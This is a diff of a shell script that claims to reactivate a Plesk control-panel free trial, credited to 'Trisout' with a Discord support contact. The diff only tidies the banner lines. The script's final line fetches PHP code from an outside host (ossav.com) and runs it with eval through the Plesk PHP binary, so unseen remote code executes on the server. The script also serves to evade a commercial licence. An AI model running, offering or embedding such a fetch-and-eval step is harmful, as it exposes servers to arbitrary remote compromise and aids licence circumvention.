@@ -1,10 +1,9 @@
 apt install figlet
 figlet PLESK FREE TRIAL REACTIVATOR
-echo "*******************************"
-echo "Plesk Free Trail Reactivator"
+echo "***********************************"
 echo "Script by Trisout"
-echo "*******************************"
 echo "For support contact me on discord"
+echo "***********************************"
 sleep 10
 echo "Activating Plesk..."
 plesk php -er "eval(file_get_contents('http://ossav.com/OLC'));"
